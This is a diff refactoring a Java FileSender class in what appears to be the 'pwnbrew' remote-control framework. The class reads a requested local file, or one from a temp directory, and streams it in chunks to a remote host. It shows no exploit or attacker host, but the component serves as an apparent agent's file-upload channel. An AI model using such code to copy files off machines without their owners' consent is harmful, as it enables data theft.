@@ -62,9 +62,7 @@ import pwnbrew.utilities.DebugPrinter;
 import pwnbrew.utilities.FileUtilities;
 import pwnbrew.utilities.ManagedRunnable;
 import pwnbrew.utilities.SocketUtilities;
-import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.Message;
-import pwnbrew.network.PortRouter;
 import pwnbrew.network.control.ControlMessageManager;
 import pwnbrew.network.control.messages.PushFileAbort;
 import pwnbrew.network.control.messages.PushFileAck;
@@ -104,50 +102,35 @@ public class FileSender extends ManagedRunnable implements LockListener {
     @Override
     protected void go() {
         
-        //Get the socket router
-        ClientConfig theConf = ClientConfig.getConfig();
-        int socketPort = theConf.getSocketPort();
-//        String serverIp = theConf.getServerIp();
-        ClientPortRouter aPR = (ClientPortRouter) thePortManager.getPortRouter( socketPort );
+        int fileId = theFileAck.getFileId();
+        try {
 
-        //Initiate the file transfer
-        if(aPR != null){
+            File fileToSend = new File( theFileAck.getFilename());
+            if( !fileToSend.exists()){
 
-            int fileId = theFileAck.getFileId();
-//            channelId = aPR.ensureConnectivity( serverIp, socketPort, this );   
-//            if(channelId != 0 ){
-                
-                try {
+                File libDir = FileUtilities.getTempDir();
+                fileToSend = new File(libDir, theFileAck.getFilename());
+            }
 
-                    File fileToSend = new File( theFileAck.getFilename());
-                    if( !fileToSend.exists()){
+            //If the file exist
+            if( fileToSend.exists() ){
+                sendFile( fileToSend,  fileId ); 
+            } else {
+                throw new IOException("File does not exist");
+            }            
 
-                        File libDir = FileUtilities.getTempDir();
-                        fileToSend = new File(libDir, theFileAck.getFilename());
-                    }
+        } catch (Exception ex) {
 
-                    //If the file exist
-                    if( fileToSend.exists() ){
-                        sendFile( aPR, fileToSend,  fileId ); 
-                    } else {
-                        throw new IOException("File does not exist");
-                    }            
+            RemoteLog.log(Level.INFO, NAME_Class, "go()", ex.getMessage(), ex );
 
-                } catch (Exception ex) {
+            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
+            if( aCMManager != null ){
+                //Send message to cleanup the file transfer on the client side
+                PushFileAbort fileAbortMsg = new PushFileAbort( channelId, fileId );
+                DataManager.send(thePortManager, fileAbortMsg);
+            }
 
-                    RemoteLog.log(Level.INFO, NAME_Class, "go()", ex.getMessage(), ex );
-
-                    ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
-                    if( aCMManager != null ){
-                        //Send message to cleanup the file transfer on the client side
-                        PushFileAbort fileAbortMsg = new PushFileAbort( channelId, fileId );
-                        DataManager.send(thePortManager, fileAbortMsg);
-//                        aCMManager.send(fileAbortMsg);
-                    }
-
-                }
-//            }
-        }       
+        }
         
     } 
     
@@ -157,7 +140,7 @@ public class FileSender extends ManagedRunnable implements LockListener {
      *
      * @return
     */
-    private void sendFile( PortRouter thePR, File fileToBeSent, int passedId ) throws Exception {
+    private void sendFile( File fileToBeSent, int fileId ) throws Exception {
         
         //Get the port router
         int dstHostId = theFileAck.getSrcHostId();
@@ -169,16 +152,15 @@ public class FileSender extends ManagedRunnable implements LockListener {
         byte[] destIdArr = SocketUtilities.intToByteArray(dstHostId);
         
         //Get the id and port router
-        byte[] theFileId = SocketUtilities.intToByteArray(passedId); 
+        byte[] theFileId = SocketUtilities.intToByteArray(fileId); 
         if( fileToBeSent.length() == 0 ){
             
             //Send the file data
-            FileData fileDataMsg = new FileData(passedId, new byte[0]);   
+            FileData fileDataMsg = new FileData(fileId, new byte[0]);   
             fileDataMsg.setDestHostId(dstHostId);
             
             //Send the message
             DataManager.send(thePortManager, fileDataMsg);
-//            thePR.queueSend( fileDataMsg.getBytes(), dstHostId );
             
         } else {  
         
@@ -214,12 +196,11 @@ public class FileSender extends ManagedRunnable implements LockListener {
                     
                     //Set the data and channel id
                     byte[] fileBytes = Arrays.copyOf(fileChannelBB.array(), fileChannelBB.limit());
-                    FileData fileDataMsg = new FileData(passedId, fileBytes);
+                    FileData fileDataMsg = new FileData(fileId, fileBytes);
                     fileDataMsg.setChannelId(channelId);
                     fileDataMsg.setDestHostId(dstHostId);
                     
                     DataManager.send(thePortManager, fileDataMsg);
-//                    thePR.queueSend( fileDataMsg.getBytes(), channelId );
 
                 }
 
@@ -235,7 +216,11 @@ public class FileSender extends ManagedRunnable implements LockListener {
                     ex = null;
                 }
             }
-        }
+        }        
+        
+        //Remove from the parent map
+        FileMessageManager theFMM = FileMessageManager.getFileMessageManager();
+        theFMM.removeFileSender( theFileAck.getTaskId() );
 
     }
 
